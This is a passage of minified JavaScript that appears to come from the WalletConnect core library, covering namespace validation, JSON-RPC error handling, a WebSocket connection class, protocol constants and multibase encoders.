        Approved: ${f.toString()}`))}),o.forEach(h=>{r||(Gn(i[h].methods,s[h].methods)?Gn(i[h].events,s[h].events)||(r=V("NON_CONFORMING_NAMESPACES",`${n} namespaces events don't satisfy namespace events for ${h}`)):r=V("NON_CONFORMING_NAMESPACES",`${n} namespaces methods don't satisfy namespace methods for ${h}`))}),r}function j8(t){const e={};return Object.keys(t).forEach(n=>{var r;n.includes(":")?e[n]=t[n]:(r=t[n].chains)==null||r.forEach(i=>{e[i]={methods:t[n].methods,events:t[n].events}})}),e}function Mh(t){return[...new Set(t.map(e=>e.includes(":")?e.split(":")[0]:e))]}function q8(t){const e={};return Object.keys(t).forEach(n=>{n.includes(":")?e[n]=t[n]:Vr(t[n].accounts)?.forEach(i=>{e[i]={accounts:t[n].accounts.filter(s=>s.includes(`${i}:`)),methods:t[n].methods,events:t[n].events}})}),e}function z8(t,e){return Xc(t)&&t<=e.max&&t>=e.min}function Lh(){const t=Ni();return new Promise(e=>{switch(t){case ft.browser:e(V8());break;case ft.reactNative:e(W8());break;case ft.node:e(K8());break;default:e(!0)}})}function V8(){return zr()&&navigator?.onLine}async function W8(){return Bn()&&typeof global<"u"&&global!=null&&global.NetInfo?(await(global==null?void 0:global.NetInfo.fetch()))?.isConnected:!0}function K8(){return!0}function H8(t){switch(Ni()){case ft.browser:G8(t);break;case ft.reactNative:Y8(t);break}}function G8(t){!Bn()&&zr()&&(window.addEventListener("online",()=>t(!0)),window.addEventListener("offline",()=>t(!1)))}function Y8(t){Bn()&&typeof global<"u"&&global!=null&&global.NetInfo&&global?.NetInfo.addEventListener(e=>t(e?.isConnected))}function Z8(){var t;return zr()&&cn.getDocument()?((t=cn.getDocument())==null?void 0:t.visibilityState)==="visible":!0}const oa={};class ti{static get(e){return oa[e]}static set(e,n){oa[e]=n}static delete(e){delete oa[e]}}function X8(t){const e=Ri.decode(t);if(e.length<33)throw new Error("Too short to contain a public key");return e.slice(1,33)}function J8({publicKey:t,signature:e,payload:n}){var r;const i=Xa(n.method),s=128|parseInt(((r=n.version)==null?void 0:r.toString())||"4"),o=tS(n.address),a=n.era==="00"?new Uint8Array([0]):Xa(n.era);if(a.length!==1&&a.length!==2)throw new Error("Invalid era length");const c=parseInt(n.nonce,16),l=new Uint8Array([c&255,c>>8&255]),u=BigInt(`0x${eS(n.tip)}`),h=rS(u),f=new Uint8Array([0,...t,o,...e,...a,...l,...h,...i]),p=nS(f.length+1);return new Uint8Array([...p,s,...f])}function Q8(t){const e=Xa(t),n=Bx.blake2b(e,void 0,32);return"0x"+Buffer.from(n).toString("hex")}function Xa(t){return new Uint8Array(t.replace(/^0x/,"").match(/.{1,2}/g).map(e=>parseInt(e,16)))}function eS(t){return t.startsWith("0x")?t.slice(2):t}function tS(t){const e=Ri.decode(t)[0];return e===42?0:e===60?2:1}function nS(t){if(t<64)return new Uint8Array([t<<2]);if(t<16384){const e=t<<2|1;return new Uint8Array([e&255,e>>8&255])}else if(t<1<<30){const e=t<<2|2;return new Uint8Array([e&255,e>>8&255,e>>16&255,e>>24&255])}else throw new Error("Compact encoding > 2^30 not supported")}function rS(t){if(t<BigInt(1)<<BigInt(6))return new Uint8Array([Number(t<<BigInt(2))]);if(t<BigInt(1)<<BigInt(14)){const e=t<<BigInt(2)|BigInt(1);return new Uint8Array([Number(e&BigInt(255)),Number(e>>BigInt(8)&BigInt(255))])}else if(t<BigInt(1)<<BigInt(30)){const e=t<<BigInt(2)|BigInt(2);return new Uint8Array([Number(e&BigInt(255)),Number(e>>BigInt(8)&BigInt(255)),Number(e>>BigInt(16)&BigInt(255)),Number(e>>BigInt(24)&BigInt(255))])}else throw new Error("BigInt compact encoding not supported > 2^30")}function iS(t){const e=Uint8Array.from(Buffer.from(t.signature,"hex")),n=X8(t.transaction.address),r=J8({publicKey:n,signature:e,payload:t.transaction}),i=Buffer.from(r).toString("hex");return Q8(i)}function Ag({logger:t,name:e}){const n=typeof t=="string"?Yf({opts:{level:t,name:e}}).logger:t;return n.level=typeof t=="string"?t:t.level,n}const sS="PARSE_ERROR",oS="INVALID_REQUEST",aS="METHOD_NOT_FOUND",cS="INVALID_PARAMS",Og="INTERNAL_ERROR",Jc="SERVER_ERROR",lS=[-32700,-32600,-32601,-32602,-32603],yi={[sS]:{code:-32700,message:"Parse error"},[oS]:{code:-32600,message:"Invalid Request"},[aS]:{code:-32601,message:"Method not found"},[cS]:{code:-32602,message:"Invalid params"},[Og]:{code:-32603,message:"Internal error"},[Jc]:{code:-32e3,message:"Server error"}},$g=Jc;function uS(t){return lS.includes(t)}function Fh(t){return Object.keys(yi).includes(t)?yi[t]:yi[$g]}function hS(t){const e=Object.values(yi).find(n=>n.code===t);return e||yi[$g]}function fS(t,e,n){return t.message.includes("getaddrinfo ENOTFOUND")||t.message.includes("connect ECONNREFUSED")?new Error(`Unavailable ${n} RPC url at ${e}`):t}var aa={};var Ja=function(t,e){return Ja=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(n,r){n.__proto__=r}||function(n,r){for(var i in r)r.hasOwnProperty(i)&&(n[i]=r[i])},Ja(t,e)};function dS(t,e){Ja(t,e);function n(){this.constructor=t}t.prototype=e===null?Object.create(e):(n.prototype=e.prototype,new n)}var Qa=function(){return Qa=Object.assign||function(e){for(var n,r=1,i=arguments.length;r<i;r++){n=arguments[r];for(var s in n)Object.prototype.hasOwnProperty.call(n,s)&&(e[s]=n[s])}return e},Qa.apply(this,arguments)};function pS(t,e){var n={};for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&e.indexOf(r)<0&&(n[r]=t[r]);if(t!=null&&typeof Object.getOwnPropertySymbols=="function")for(var i=0,r=Object.getOwnPropertySymbols(t);i<r.length;i++)e.indexOf(r[i])<0&&Object.prototype.propertyIsEnumerable.call(t,r[i])&&(n[r[i]]=t[r[i]]);return n}function gS(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s}function yS(t,e){return function(n,r){e(n,r,t)}}function mS(t,e){if(typeof Reflect=="object"&&typeof Reflect.metadata=="function")return Reflect.metadata(t,e)}function wS(t,e,n,r){function i(s){return s instanceof n?s:new n(function(o){o(s)})}return new(n||(n=Promise))(function(s,o){function a(u){try{l(r.next(u))}catch(h){o(h)}}function c(u){try{l(r.throw(u))}catch(h){o(h)}}function l(u){u.done?s(u.value):i(u.value).then(a,c)}l((r=r.apply(t,e||[])).next())})}function bS(t,e){var n={label:0,sent:function(){if(s[0]&1)throw s[1];return s[1]},trys:[],ops:[]},r,i,s,o;return o={next:a(0),throw:a(1),return:a(2)},typeof Symbol=="function"&&(o[Symbol.iterator]=function(){return this}),o;function a(l){return function(u){return c([l,u])}}function c(l){if(r)throw new TypeError("Generator is already executing.");for(;n;)try{if(r=1,i&&(s=l[0]&2?i.return:l[0]?i.throw||((s=i.return)&&s.call(i),0):i.next)&&!(s=s.call(i,l[1])).done)return s;switch(i=0,s&&(l=[l[0]&2,s.value]),l[0]){case 0:case 1:s=l;break;case 4:return n.label++,{value:l[1],done:!1};case 5:n.label++,i=l[1],l=[0];continue;case 7:l=n.ops.pop(),n.trys.pop();continue;default:if(s=n.trys,!(s=s.length>0&&s[s.length-1])&&(l[0]===6||l[0]===2)){n=0;continue}if(l[0]===3&&(!s||l[1]>s[0]&&l[1]<s[3])){n.label=l[1];break}if(l[0]===6&&n.label<s[1]){n.label=s[1],s=l;break}if(s&&n.label<s[2]){n.label=s[2],n.ops.push(l);break}s[2]&&n.ops.pop(),n.trys.pop();continue}l=e.call(t,n)}catch(u){l=[6,u],i=0}finally{r=s=0}if(l[0]&5)throw l[1];return{value:l[0]?l[1]:void 0,done:!0}}}function vS(t,e,n,r){r===void 0&&(r=n),t[r]=e[n]}function ES(t,e){for(var n in t)n!=="default"&&!e.hasOwnProperty(n)&&(e[n]=t[n])}function ec(t){var e=typeof Symbol=="function"&&Symbol.iterator,n=e&&t[e],r=0;if(n)return n.call(t);if(t&&typeof t.length=="number")return{next:function(){return t&&r>=t.length&&(t=void 0),{value:t&&t[r++],done:!t}}};throw new TypeError(e?"Object is not iterable.":"Symbol.iterator is not defined.")}function Cg(t,e){var n=typeof Symbol=="function"&&t[Symbol.iterator];if(!n)return t;var r=n.call(t),i,s=[],o;try{for(;(e===void 0||e-- >0)&&!(i=r.next()).done;)s.push(i.value)}catch(a){o={error:a}}finally{try{i&&!i.done&&(n=r.return)&&n.call(r)}finally{if(o)throw o.error}}return s}function xS(){for(var t=[],e=0;e<arguments.length;e++)t=t.concat(Cg(arguments[e]));return t}function _S(){for(var t=0,e=0,n=arguments.length;e<n;e++)t+=arguments[e].length;for(var r=Array(t),i=0,e=0;e<n;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,i++)r[i]=s[o];return r}function $i(t){return this instanceof $i?(this.v=t,this):new $i(t)}function IS(t,e,n){if(!Symbol.asyncIterator)throw new TypeError("Symbol.asyncIterator is not defined.");var r=n.apply(t,e||[]),i,s=[];return i={},o("next"),o("throw"),o("return"),i[Symbol.asyncIterator]=function(){return this},i;function o(f){r[f]&&(i[f]=function(p){return new Promise(function(d,g){s.push([f,p,d,g])>1||a(f,p)})})}function a(f,p){try{c(r[f](p))}catch(d){h(s[0][3],d)}}function c(f){f.value instanceof $i?Promise.resolve(f.value.v).then(l,u):h(s[0][2],f)}function l(f){a("next",f)}function u(f){a("throw",f)}function h(f,p){f(p),s.shift(),s.length&&a(s[0][0],s[0][1])}}function SS(t){var e,n;return e={},r("next"),r("throw",function(i){throw i}),r("return"),e[Symbol.iterator]=function(){return this},e;function r(i,s){e[i]=t[i]?function(o){return(n=!n)?{value:$i(t[i](o)),done:i==="return"}:s?s(o):o}:s}}function DS(t){if(!Symbol.asyncIterator)throw new TypeError("Symbol.asyncIterator is not defined.");var e=t[Symbol.asyncIterator],n;return e?e.call(t):(t=typeof ec=="function"?ec(t):t[Symbol.iterator](),n={},r("next"),r("throw"),r("return"),n[Symbol.asyncIterator]=function(){return this},n);function r(s){n[s]=t[s]&&function(o){return new Promise(function(a,c){o=t[s](o),i(a,c,o.done,o.value)})}}function i(s,o,a,c){Promise.resolve(c).then(function(l){s({value:l,done:a})},o)}}function AS(t,e){return Object.defineProperty?Object.defineProperty(t,"raw",{value:e}):t.raw=e,t}function OS(t){if(t&&t.__esModule)return t;var e={};if(t!=null)for(var n in t)Object.hasOwnProperty.call(t,n)&&(e[n]=t[n]);return e.default=t,e}function $S(t){return t&&t.__esModule?t:{default:t}}function CS(t,e){if(!e.has(t))throw new TypeError("attempted to get private field on non-instance");return e.get(t)}function PS(t,e,n){if(!e.has(t))throw new TypeError("attempted to set private field on non-instance");return e.set(t,n),n}const TS=Object.freeze(Object.defineProperty({__proto__:null,get __assign(){return Qa},__asyncDelegator:SS,__asyncGenerator:IS,__asyncValues:DS,__await:$i,__awaiter:wS,__classPrivateFieldGet:CS,__classPrivateFieldSet:PS,__createBinding:vS,__decorate:gS,__exportStar:ES,__extends:dS,__generator:bS,__importDefault:$S,__importStar:OS,__makeTemplateObject:AS,__metadata:mS,__param:yS,__read:Cg,__rest:pS,__spread:xS,__spreadArrays:_S,__values:ec},Symbol.toStringTag,{value:"Module"})),BS=jf(TS);var Zt={},jh;function RS(){if(jh)return Zt;jh=1,Object.defineProperty(Zt,"__esModule",{value:!0}),Zt.isBrowserCryptoAvailable=Zt.getSubtleCrypto=Zt.getBrowerCrypto=void 0;function t(){return gr?.crypto||gr?.msCrypto||{}}Zt.getBrowerCrypto=t;function e(){const r=t();return r.subtle||r.webkitSubtle}Zt.getSubtleCrypto=e;function n(){return!!t()&&!!e()}return Zt.isBrowserCryptoAvailable=n,Zt}var Xt={},qh;function kS(){if(qh)return Xt;qh=1,Object.defineProperty(Xt,"__esModule",{value:!0}),Xt.isBrowser=Xt.isNode=Xt.isReactNative=void 0;function t(){return typeof document>"u"&&typeof navigator<"u"&&navigator.product==="ReactNative"}Xt.isReactNative=t;function e(){return typeof process<"u"&&typeof process.versions<"u"&&typeof process.versions.node<"u"}Xt.isNode=e;function n(){return!t()&&!e()}return Xt.isBrowser=n,Xt}var zh;function NS(){return zh||(zh=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0});const e=BS;e.__exportStar(RS(),t),e.__exportStar(kS(),t)})(aa)),aa}var US=NS();function jt(t=3){const e=Date.now()*Math.pow(10,t),n=Math.floor(Math.random()*Math.pow(10,t));return e+n}function On(t=6){return BigInt(jt(t))}function rn(t,e,n){return{id:n||jt(),jsonrpc:"2.0",method:t,params:e}}function Ls(t,e){return{id:t,jsonrpc:"2.0",result:e}}function Qc(t,e,n){return{id:t,jsonrpc:"2.0",error:MS(e)}}function MS(t,e){return typeof t>"u"?Fh(Og):(typeof t=="string"&&(t=Object.assign(Object.assign({},Fh(Jc)),{message:t})),uS(t.code)&&(t=hS(t.code)),t)}class LS{}class FS extends LS{constructor(){super()}}class jS extends FS{constructor(e){super()}}const qS="^wss?:";function zS(t){const e=t.match(new RegExp(/^\w+:/,"gi"));if(!(!e||!e.length))return e[0]}function VS(t,e){const n=zS(t);return typeof n>"u"?!1:new RegExp(e).test(n)}function Vh(t){return VS(t,qS)}function WS(t){return new RegExp("wss?://localhost(:d{2,5})?").test(t)}function Pg(t){return typeof t=="object"&&"id"in t&&"jsonrpc"in t&&t.jsonrpc==="2.0"}function el(t){return Pg(t)&&"method"in t}function oo(t){return Pg(t)&&(qt(t)||vt(t))}function qt(t){return"result"in t}function vt(t){return"error"in t}class KS extends jS{constructor(e){super(e),this.events=new Tt.EventEmitter,this.hasRegisteredEventListeners=!1,this.connection=this.setConnection(e),this.connection.connected&&this.registerEventListeners()}async connect(e=this.connection){await this.open(e)}async disconnect(){await this.close()}on(e,n){this.events.on(e,n)}once(e,n){this.events.once(e,n)}off(e,n){this.events.off(e,n)}removeListener(e,n){this.events.removeListener(e,n)}async request(e,n){return this.requestStrict(rn(e.method,e.params||[],e.id||On().toString()),n)}async requestStrict(e,n){return new Promise(async(r,i)=>{if(!this.connection.connected)try{await this.open()}catch(s){i(s)}this.events.on(`${e.id}`,s=>{vt(s)?i(s.error):r(s.result)});try{await this.connection.send(e,n)}catch(s){i(s)}})}setConnection(e=this.connection){return e}onPayload(e){this.events.emit("payload",e),oo(e)?this.events.emit(`${e.id}`,e):this.events.emit("message",{type:e.method,data:e.params})}onClose(e){e&&e.code===3e3&&this.events.emit("error",new Error(`WebSocket connection closed abnormally with code: ${e.code} ${e.reason?`(${e.reason})`:""}`)),this.events.emit("disconnect")}async open(e=this.connection){this.connection===e&&this.connection.connected||(this.connection.connected&&this.close(),typeof e=="string"&&(await this.connection.open(e),e=this.connection),this.connection=this.setConnection(e),await this.connection.open(),this.registerEventListeners(),this.events.emit("connect"))}async close(){await this.connection.close()}registerEventListeners(){this.hasRegisteredEventListeners||(this.connection.on("payload",e=>this.onPayload(e)),this.connection.on("close",e=>this.onClose(e)),this.connection.on("error",e=>this.events.emit("error",e)),this.connection.on("register_error",e=>this.onClose()),this.hasRegisteredEventListeners=!0)}}const HS=()=>typeof WebSocket<"u"?WebSocket:typeof global<"u"&&typeof global.WebSocket<"u"?global.WebSocket:typeof window<"u"&&typeof window.WebSocket<"u"?window.WebSocket:typeof self<"u"&&typeof self.WebSocket<"u"?self.WebSocket:require("ws"),GS=()=>typeof WebSocket<"u"||typeof global<"u"&&typeof global.WebSocket<"u"||typeof window<"u"&&typeof window.WebSocket<"u"||typeof self<"u"&&typeof self.WebSocket<"u",Wh=t=>t.split("?")[0],Kh=10,YS=HS();let ZS=class{constructor(e){if(this.url=e,this.events=new Tt.EventEmitter,this.registering=!1,!Vh(e))throw new Error(`Provided URL is not compatible with WebSocket connection: ${e}`);this.url=e}get connected(){return typeof this.socket<"u"}get connecting(){return this.registering}on(e,n){this.events.on(e,n)}once(e,n){this.events.once(e,n)}off(e,n){this.events.off(e,n)}removeListener(e,n){this.events.removeListener(e,n)}async open(e=this.url){await this.register(e)}async close(){return new Promise((e,n)=>{if(typeof this.socket>"u"){n(new Error("Connection already closed"));return}this.socket.onclose=r=>{this.onClose(r),e()},this.socket.close()})}async send(e){typeof this.socket>"u"&&(this.socket=await this.register());try{this.socket.send(rr(e))}catch(n){this.onError(e.id,n)}}register(e=this.url){if(!Vh(e))throw new Error(`Provided URL is not compatible with WebSocket connection: ${e}`);if(this.registering){const n=this.events.getMaxListeners();return(this.events.listenerCount("register_error")>=n||this.events.listenerCount("open")>=n)&&this.events.setMaxListeners(n+1),new Promise((r,i)=>{this.events.once("register_error",s=>{this.resetMaxListeners(),i(s)}),this.events.once("open",()=>{if(this.resetMaxListeners(),typeof this.socket>"u")return i(new Error("WebSocket connection is missing or invalid"));r(this.socket)})})}return this.url=e,this.registering=!0,new Promise((n,r)=>{const i=US.isReactNative()?void 0:{rejectUnauthorized:!WS(e)},s=new YS(e,[],i);GS()?s.onerror=o=>{const a=o;r(this.emitError(a.error))}:s.on("error",o=>{r(this.emitError(o))}),s.onopen=()=>{this.onOpen(s),n(s)}})}onOpen(e){e.onmessage=n=>this.onPayload(n),e.onclose=n=>this.onClose(n),this.socket=e,this.registering=!1,this.events.emit("open")}onClose(e){this.socket=void 0,this.registering=!1,this.events.emit("close",e)}onPayload(e){if(typeof e.data>"u")return;const n=typeof e.data=="string"?Br(e.data):e.data;this.events.emit("payload",n)}onError(e,n){const r=this.parseError(n),i=r.message||r.toString(),s=Qc(e,i);this.events.emit("payload",s)}parseError(e,n=this.url){return fS(e,Wh(n),"WS")}resetMaxListeners(){this.events.getMaxListeners()>Kh&&this.events.setMaxListeners(Kh)}emitError(e){const n=this.parseError(new Error(e?.message||`WebSocket connection failed for host: ${Wh(this.url)}`));return this.events.emit("register_error",n),n}};var XS={};const Tg="wc",Bg=2,tc="core",Vt=`${Tg}@2:${tc}:`,JS={logger:"error"},QS={database:":memory:"},eD="crypto",Hh="client_ed25519_seed",tD=z.ONE_DAY,nD="keychain",rD="0.3",iD="messages",sD="0.3",oD=z.SIX_HOURS,aD="publisher",Rg="irn",cD="error",kg="wss://relay.walletconnect.org",lD="relayer",we={message:"relayer_message",message_ack:"relayer_message_ack",connect:"relayer_connect",disconnect:"relayer_disconnect",error:"relayer_error",connection_stalled:"relayer_connection_stalled",transport_closed:"relayer_transport_closed",publish:"relayer_publish"},uD="_subscription",gt={payload:"payload",connect:"connect",disconnect:"disconnect",error:"error"},hD=.1,nc="2.23.0",he={link_mode:"link_mode",relay:"relay"},gs={inbound:"inbound",outbound:"outbound"},fD="0.3",dD="WALLETCONNECT_CLIENT_ID",Gh="WALLETCONNECT_LINK_MODE_APPS",lt={created:"subscription_created",deleted:"subscription_deleted",expired:"subscription_expired",disabled:"subscription_disabled",sync:"subscription_sync",resubscribed:"subscription_resubscribed"},pD="subscription",gD="0.3",yD="pairing",mD="0.3",ni={wc_pairingDelete:{req:{ttl:z.ONE_DAY,prompt:!1,tag:1e3},res:{ttl:z.ONE_DAY,prompt:!1,tag:1001}},wc_pairingPing:{req:{ttl:z.THIRTY_SECONDS,prompt:!1,tag:1002},res:{ttl:z.THIRTY_SECONDS,prompt:!1,tag:1003}},unregistered_method:{req:{ttl:z.ONE_DAY,prompt:!1,tag:0},res:{ttl:z.ONE_DAY,prompt:!1,tag:0}}},Kn={create:"pairing_create",expire:"pairing_expire",delete:"pairing_delete",ping:"pairing_ping"},St={created:"history_created",updated:"history_updated",deleted:"history_deleted",sync:"history_sync"},wD="history",bD="0.3",vD="expirer",mt={created:"expirer_created",deleted:"expirer_deleted",expired:"expirer_expired",sync:"expirer_sync"},ED="0.3",xD="verify-api",_D="https://verify.walletconnect.com",Ng="https://verify.walletconnect.org",mi=Ng,ID=`${mi}/v3`,SD=[_D,Ng],DD="echo",AD="https://echo.walletconnect.com",Ft={pairing_started:"pairing_started",pairing_uri_validation_success:"pairing_uri_validation_success",pairing_uri_not_expired:"pairing_uri_not_expired",store_new_pairing:"store_new_pairing",subscribing_pairing_topic:"subscribing_pairing_topic",subscribe_pairing_topic_success:"subscribe_pairing_topic_success",existing_pairing:"existing_pairing",pairing_not_expired:"pairing_not_expired",emit_inactive_pairing:"emit_inactive_pairing",emit_session_proposal:"emit_session_proposal",subscribing_to_pairing_topic:"subscribing_to_pairing_topic"},Qt={no_wss_connection:"no_wss_connection",no_internet_connection:"no_internet_connection",malformed_pairing_uri:"malformed_pairing_uri",active_pairing_already_exists:"active_pairing_already_exists",subscribe_pairing_topic_failure:"subscribe_pairing_topic_failure",pairing_expired:"pairing_expired",proposal_expired:"proposal_expired",proposal_listener_not_found:"proposal_listener_not_found"},Dt={session_approve_started:"session_approve_started",proposal_not_expired:"proposal_not_expired",session_namespaces_validation_success:"session_namespaces_validation_success",create_session_topic:"create_session_topic",subscribing_session_topic:"subscribing_session_topic",subscribe_session_topic_success:"subscribe_session_topic_success",publishing_session_approve:"publishing_session_approve",session_approve_publish_success:"session_approve_publish_success",store_session:"store_session",publishing_session_settle:"publishing_session_settle",session_settle_publish_success:"session_settle_publish_success",session_request_response_started:"session_request_response_started",session_request_response_validation_success:"session_request_response_validation_success",session_request_response_publish_started:"session_request_response_publish_started"},Fn={no_internet_connection:"no_internet_connection",no_wss_connection:"no_wss_connection",proposal_expired:"proposal_expired",subscribe_session_topic_failure:"subscribe_session_topic_failure",session_approve_publish_failure:"session_approve_publish_failure",session_settle_publish_failure:"session_settle_publish_failure",session_approve_namespace_validation_failure:"session_approve_namespace_validation_failure",proposal_not_found:"proposal_not_found",session_request_response_validation_failure:"session_request_response_validation_failure",session_request_response_publish_failure:"session_request_response_publish_failure"},jn={authenticated_session_approve_started:"authenticated_session_approve_started",create_authenticated_session_topic:"create_authenticated_session_topic",cacaos_verified:"cacaos_verified",store_authenticated_session:"store_authenticated_session",subscribing_authenticated_session_topic:"subscribing_authenticated_session_topic",subscribe_authenticated_session_topic_success:"subscribe_authenticated_session_topic_success",publishing_authenticated_session_approve:"publishing_authenticated_session_approve"},ri={no_internet_connection:"no_internet_connection",invalid_cacao:"invalid_cacao",subscribe_authenticated_session_topic_failure:"subscribe_authenticated_session_topic_failure",authenticated_session_approve_publish_failure:"authenticated_session_approve_publish_failure",authenticated_session_pending_request_not_found:"authenticated_session_pending_request_not_found"},OD=.1,$D="event-client",CD=86400,PD="https://pulse.walletconnect.org/batch";function TD(t,e){if(t.length>=255)throw new TypeError("Alphabet too long");for(var n=new Uint8Array(256),r=0;r<n.length;r++)n[r]=255;for(var i=0;i<t.length;i++){var s=t.charAt(i),o=s.charCodeAt(0);if(n[o]!==255)throw new TypeError(s+" is ambiguous");n[o]=i}var a=t.length,c=t.charAt(0),l=Math.log(a)/Math.log(256),u=Math.log(256)/Math.log(a);function h(d){if(d instanceof Uint8Array||(ArrayBuffer.isView(d)?d=new Uint8Array(d.buffer,d.byteOffset,d.byteLength):Array.isArray(d)&&(d=Uint8Array.from(d))),!(d instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(d.length===0)return"";for(var g=0,w=0,_=0,C=d.length;_!==C&&d[_]===0;)_++,g++;for(var v=(C-_)*u+1>>>0,b=new Uint8Array(v);_!==C;){for(var x=d[_],O=0,B=v-1;(x!==0||O<w)&&B!==-1;B--,O++)x+=256*b[B]>>>0,b[B]=x%a>>>0,x=x/a>>>0;if(x!==0)throw new Error("Non-zero carry");w=O,_++}for(var k=v-w;k!==v&&b[k]===0;)k++;for(var $=c.repeat(g);k<v;++k)$+=t.charAt(b[k]);return $}function f(d){if(typeof d!="string")throw new TypeError("Expected String");if(d.length===0)return new Uint8Array;var g=0;if(d[g]!==" "){for(var w=0,_=0;d[g]===c;)w++,g++;for(var C=(d.length-g)*l+1>>>0,v=new Uint8Array(C);d[g];){var b=n[d.charCodeAt(g)];if(b===255)return;for(var x=0,O=C-1;(b!==0||x<_)&&O!==-1;O--,x++)b+=a*v[O]>>>0,v[O]=b%256>>>0,b=b/256>>>0;if(b!==0)throw new Error("Non-zero carry");_=x,g++}if(d[g]!==" "){for(var B=C-_;B!==C&&v[B]===0;)B++;for(var k=new Uint8Array(w+(C-B)),$=w;B!==C;)k[$++]=v[B++];return k}}}function p(d){var g=f(d);if(g)return g;throw new Error(`Non-${e} character`)}return{encode:h,decodeUnsafe:f,decode:p}}var BD=TD,RD=BD;const Ug=t=>{if(t instanceof Uint8Array&&t.constructor.name==="Uint8Array")return t;if(t instanceof ArrayBuffer)return new Uint8Array(t);if(ArrayBuffer.isView(t))return new Uint8Array(t.buffer,t.byteOffset,t.byteLength);throw new Error("Unknown type, must be binary type")},kD=t=>new TextEncoder().encode(t),ND=t=>new TextDecoder().decode(t);class UD{constructor(e,n,r){this.name=e,this.prefix=n,this.baseEncode=r}encode(e){if(e instanceof Uint8Array)return`${this.prefix}${this.baseEncode(e)}`;throw Error("Unknown type, must be binary type")}}class MD{constructor(e,n,r){if(this.name=e,this.prefix=n,n.codePointAt(0)===void 0)throw new Error("Invalid prefix character");this.prefixCodePoint=n.codePointAt(0),this.baseDecode=r}decode(e){if(typeof e=="string"){if(e.codePointAt(0)!==this.prefixCodePoint)throw Error(`Unable to decode multibase string ${JSON.stringify(e)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);return this.baseDecode(e.slice(this.prefix.length))}else throw Error("Can only multibase decode strings")}or(e){return Mg(this,e)}}class LD{constructor(e){this.decoders=e}or(e){return Mg(this,e)}decode(e){const n=e[0],r=this.decoders[n];if(r)return r.decode(e);throw RangeError(`Unable to decode multibase string ${JSON.stringify(e)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)}}const Mg=(t,e)=>new LD({...t.decoders||{[t.prefix]:t},...e.decoders||{[e.prefix]:e}});class FD{constructor(e,n,r,i){this.name=e,this.prefix=n,this.baseEncode=r,this.baseDecode=i,this.encoder=new UD(e,n,r),this.decoder=new MD(e,n,i)}encode(e){return this.encoder.encode(e)}decode(e){return this.decoder.decode(e)}}const ao=({name:t,prefix:e,encode:n,decode:r})=>new FD(t,e,n,r),ji=({prefix:t,name:e,alphabet:n})=>{const{encode:r,decode:i}=RD(n,e);return ao({prefix:t,name:e,encode:r,decode:s=>Ug(i(s))})},jD=(t,e,n,r)=>{const i={};for(let u=0;u<e.length;++u)i[e[u]]=u;let s=t.length;for(;t[s-1]==="=";)--s;const o=new Uint8Array(s*n/8|0);let a=0,c=0,l=0;for(let u=0;u<s;++u){const h=i[t[u]];if(h===void 0)throw new SyntaxError(`Non-${r} character`);c=c<<n|h,a+=n,a>=8&&(a-=8,o[l++]=255&c>>a)}if(a>=n||255&c<<8-a)throw new SyntaxError("Unexpected end of data");return o},qD=(t,e,n)=>{const r=e[e.length-1]==="=",i=(1<<n)-1;let s="",o=0,a=0;for(let c=0;c<t.length;++c)for(a=a<<8|t[c],o+=8;o>n;)o-=n,s+=e[i&a>>o];if(o&&(s+=e[i&a<<n-o]),r)for(;s.length*n&7;)s+="=";return s},Me=({name:t,prefix:e,bitsPerChar:n,alphabet:r})=>ao({prefix:e,name:t,encode(i){return qD(i,r,n)},decode(i){return jD(i,r,n,t)}}),zD=ao({prefix:"\0",name:"identity",encode:t=>ND(t),decode:t=>kD(t)});var VD=Object.freeze({__proto__:null,identity:zD});const WD=Me({prefix:"0",name:"base2",alphabet:"01",bitsPerChar:1});var KD=Object.freeze({__proto__:null,base2:WD});const HD=Me({prefix:"7",name:"base8",alphabet:"01234567",bitsPerChar:3});var GD=Object.freeze({__proto__:null,base8:HD});const YD=ji({prefix:"9",name:"base10",alphabet:"0123456789"});var ZD=Object.freeze({__proto__:null,base10:YD});const XD=Me({prefix:"f",name:"base16",alphabet:"0123456789abcdef",bitsPerChar:4}),JD=Me({prefix:"F",name:"base16upper",alphabet:"0123456789ABCDEF",bitsPerChar:4});var QD=Object.freeze({__proto__:null,base16:XD,base16upper:JD});const e6=Me({prefix:"b",name:"base32",alphabet:"abcdefghijklmnopqrstuvwxyz234567",bitsPerChar:5}),t6=Me({prefix:"B",name:"base32upper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",bitsPerChar:5}),n6=Me({prefix:"c",name:"base32pad",alphabet:"abcdefghijklmnopqrstuvwxyz234567=",bitsPerChar:5}),r6=Me({prefix:"C",name:"base32padupper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",bitsPerChar:5}),i6=Me({prefix:"v",name:"base32hex",alphabet:"0123456789abcdefghijklmnopqrstuv",bitsPerChar:5}),s6=Me({prefix:"V",name:"base32hexupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV",bitsPerChar:5}),o6=Me({prefix:"t",name:"base32hexpad",alphabet:"0123456789abcdefghijklmnopqrstuv=",bitsPerChar:5}),a6=Me({prefix:"T",name:"base32hexpadupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV=",bitsPerChar:5}),c6=Me({prefix:"h",name:"base32z",alphabet:"ybndrfg8ejkmcpqxot1uwisza345h769",bitsPerChar:5});var l6=Object.freeze({__proto__:null,base32:e6,base32upper:t6,base32pad:n6,base32padupper:r6,base32hex:i6,base32hexupper:s6,base32hexpad:o6,base32hexpadupper:a6,base32z:c6});const u6=ji({prefix:"k",name:"base36",alphabet:"0123456789abcdefghijklmnopqrstuvwxyz"}),h6=ji({prefix:"K",name:"base36upper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"});var f6=Object.freeze({__proto__:null,base36:u6,base36upper:h6});const 